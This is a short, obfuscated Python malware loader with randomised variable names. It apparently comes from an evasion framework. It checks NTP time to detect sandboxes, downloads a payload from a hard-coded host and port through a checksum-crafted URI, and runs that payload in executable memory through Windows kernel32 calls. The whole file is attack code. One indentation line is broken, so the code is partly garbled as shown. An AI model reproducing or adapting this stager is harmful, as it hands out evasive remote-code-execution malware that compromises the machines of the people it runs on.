import urllib.request, string, random, ctypes as NfgllDLnB
import multiprocessing
WylclvXWBYAE = multiprocessing.cpu_count()
if WylclvXWBYAE >= 1:
	from time import sleep
	from socket import AF_INET, SOCK_DGRAM
	import sys
	import datetime
	import time
	import socket
	import struct
	client = socket.socket(AF_INET, SOCK_DGRAM)
	client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))
	msg, address = client.recvfrom( 1024 )
	kLeEEkrPqOS = datetime.datetime.fromtimestamp(struct.unpack("!12I",msg)[10] - 2208988800)
	sleep(4)
	client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))
	msg, address = client.recvfrom( 1024 )
	if ((datetime.datetime.fromtimestamp((struct.unpack("!12I",msg)[10] - 2208988800)) - kLeEEkrPqOS).seconds >= 4):
		def GfonMpW(s): return sum([ord(ch) for ch in s]) % 0x100
		def IGcOXlpEsEM():
	for x in range(64):
				cvAEAjzsW = ''.join(random.sample(string.ascii_letters + string.digits,3))
				mkYJXjkewMcI = ''.join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))
				for MZbChrnUJriVD in mkYJXjkewMcI:
					if GfonMpW(cvAEAjzsW + MZbChrnUJriVD) == 92: return cvAEAjzsW + MZbChrnUJriVD
		def ixCzoT(hDKyZXlpjCPDsbO, fYeuodghyTGb):
			RTacuTfoZzP = urllib.request.ProxyHandler({})
			kwffplNExP = urllib.request.build_opener(RTacuTfoZzP)
			urllib.request.install_opener(kwffplNExP)
			YRSFGnQ = urllib.request.Request("http://" + hDKyZXlpjCPDsbO + ":" + str(fYeuodghyTGb) + "/" + IGcOXlpEsEM(), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})
			try:
				gVxFLfQSGplz = urllib.request.urlopen(YRSFGnQ)
				try:
					if int(gVxFLfQSGplz.info()["Content-Length"]) > 100000: return gVxFLfQSGplz.read()
					else: return ''
				except: return gVxFLfQSGplz.read()
			except urllib.request.URLError:
				return ''
		def KPVPqKFWNcVxYCX(pfBvKsBRb):
			if pfBvKsBRb != "":
				zasmhvIyd = bytearray(pfBvKsBRb)
				YahhGmOFKvmF = NfgllDLnB.windll.kernel32.VirtualAlloc(NfgllDLnB.c_int(0),NfgllDLnB.c_int(len(zasmhvIyd)), NfgllDLnB.c_int(0x3000),NfgllDLnB.c_int(0x40))
				zVdWBqmdSBn = (NfgllDLnB.c_char * len(zasmhvIyd)).from_buffer(zasmhvIyd)
				NfgllDLnB.windll.kernel32.RtlMoveMemory(NfgllDLnB.c_int(YahhGmOFKvmF),zVdWBqmdSBn, NfgllDLnB.c_int(len(zasmhvIyd)))
				IwqwDsKOwtcNc = NfgllDLnB.windll.kernel32.CreateThread(NfgllDLnB.c_int(0),NfgllDLnB.c_int(0),NfgllDLnB.c_int(YahhGmOFKvmF),NfgllDLnB.c_int(0),NfgllDLnB.c_int(0),NfgllDLnB.pointer(NfgllDLnB.c_int(0)))
				NfgllDLnB.windll.kernel32.WaitForSingleObject(NfgllDLnB.c_int(IwqwDsKOwtcNc),NfgllDLnB.c_int(-1))
		IoKngXj = ''
		IoKngXj = ixCzoT("10.0.2.15", 8080)
		KPVPqKFWNcVxYCX(IoKngXj)
